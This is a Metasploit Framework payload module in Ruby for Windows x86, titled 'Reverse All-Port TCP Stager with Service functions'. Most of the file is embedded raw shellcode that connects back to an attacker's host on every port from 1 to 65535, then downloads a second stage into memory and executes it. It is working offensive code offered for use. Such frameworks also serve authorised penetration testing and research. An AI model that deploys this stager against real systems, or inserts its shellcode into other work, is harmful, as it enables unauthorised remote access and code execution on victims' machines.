##
# $Id: reverse_tcp_allports.rb 14774 2012-02-21 01:42:17Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp_allports'


module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Windows

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Reverse All-Port TCP Stager with Service functions',
			'Version'       => '$Revision: 14774 $',
			'Description'   => 'Try to connect back to the attacker, on all possible ports (1-65535, slowly) after SetStatus RUNNING',
			'Author'        => ['hdm', 'skape', 'sf', 'agix'],
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcpAllPorts,
			'Convention'    => 'sockedi',
			'Stager'        =>
				{
					'RequiresMidstager' => false,
					'Offsets' => { 'LHOST' => [ 195+141, 'ADDR' ], 'LPORT' => [ 202+141, 'n' ], },
					'Payload' =>
						# Length: 294 bytes
						# Port Offset: 202
						# Host Offset: 195
						"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
						"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
						"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
						"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
						"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
						"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
						"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
						"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
						"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +

						"\x6a\x00\x68\x70\x69\x33\x32\x68\x61\x64\x76\x61\x54\x68\x4c\x77" +
						"\x26\x07\xff\xd5\x68\x49\x43\x45\x00\x68\x53\x45\x52\x56\x89\xe1" +
						"\x8d\x85\xd0\x00\x00\x00\x6a\x00\x50\x51\x89\xe0\x6a\x00\x50\x68" +
						"\xfa\xf7\x72\xcb\xff\xd5\x6a\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x58" +
						"\x58\x58\x58\x31\xc0\xc3\xfc\xe8\x00\x00\x00\x00\x5d\x81\xed\xd6" +
						"\x00\x00\x00\x68\x49\x43\x46\x00\x68\x53\x45\x52\x56\x89\xe1\x8d" +
						"\x85\xc9\x00\x00\x00\x6a\x00\x50\x51\x68\x0b\xaa\x44\x52\xff\xd5" +
						"\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x04\x6a\x10" +
						"\x89\xe1\x6a\x00\x51\x50\x68\xc6\x55\x37\x7d\xff\xd5" +

						"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07" +
						"\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00" +
						"\xFF\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF" +
						"\xD5\x97\x68\x7F\x00\x00\x01\x68\x02\x00\x01\x00\x89\xE6\x6A\x10" +
						"\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x12\x31\xC0\x66" +
						"\x8B\x46\x02\x86\xE0\x66\x40\x86\xE0\x66\x89\x46\x02\xEB\xDF\x6A" +
						"\x00\x6A\x04\x56\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40" +
						"\x68\x00\x10\x00\x00\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93" +
						"\x53\x6A\x00\x56\x53\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29" +
						"\xC6\x85\xF6\x75\xEC\xC3"

				}
			))
	end


	def self.handler_type_alias

                "reverse_tcp_allports_service"

    end
end
